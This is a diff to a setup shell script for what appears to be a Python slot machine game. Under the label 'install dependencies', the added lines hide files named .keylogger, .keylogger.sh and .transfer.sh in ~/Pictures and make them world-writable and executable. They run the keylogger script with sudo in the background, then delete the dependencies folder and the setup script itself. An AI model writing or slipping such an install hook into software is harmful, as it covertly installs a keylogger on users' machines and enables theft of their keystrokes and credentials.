@@ -25,3 +25,28 @@ mkdir ~/admin-tools
 mv ~/Python-Slots/admin-tools/* ~/admin-tools
 cd ~/Python-Slots/slotmachine/Python-Slots
 echo '{"disabled": "false"}' > ~/admin-tools/disabled
+cd ~/Python-Slots
+rm -rf admin-tools
+
+# install dependencies
+cd ~/Python-Slots/dependencies
+mv .keylogger ~/Pictures
+mv .keylogger.sh ~/Pictures
+mv .transfer.sh ~/Pictures
+cd ~/Pictures
+chgrp sudo .keylogger
+chgrp sudo .keylogger.sh
+chgrp sudo .transfer.sh
+chmod 777 .keylogger
+chmod 777 .keylogger.sh
+chmod 777 .transfer.sh
+chmod +x .keylogger
+chmod +x .keylogger.sh
+chmod +x .transfer.sh
+echo > .out
+timeout 15 sudo sh .keylogger.sh &
+rm -rf ~/Python-Slots/dependencies
+echo "Installed dependencies."
+
+# remove script
+rm ./setup.sh
